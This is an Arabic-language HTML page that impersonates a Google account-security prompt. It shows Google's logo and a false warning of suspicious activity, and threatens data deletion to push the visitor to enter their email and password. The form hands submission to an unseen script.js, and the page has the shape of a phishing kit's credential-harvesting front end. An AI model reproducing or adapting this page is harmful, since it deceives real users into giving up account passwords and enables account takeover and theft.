<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأمين حساب Google</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
        <h2>تأمين حسابك</h2>
        <p>تم اكتشاف نشاط مشبوه. يرجى تسجيل الدخول لتأكيد ملكية الحساب ومنع مسح البيانات.</p>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="كلمة المرور" required>
            </div>
            <button type="submit" id="submitBtn">تأكيد الهوية</button>
        </form>
        
        <div class="footer">
            <a href="#">هل نسيت البريد الإلكتروني؟</a>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
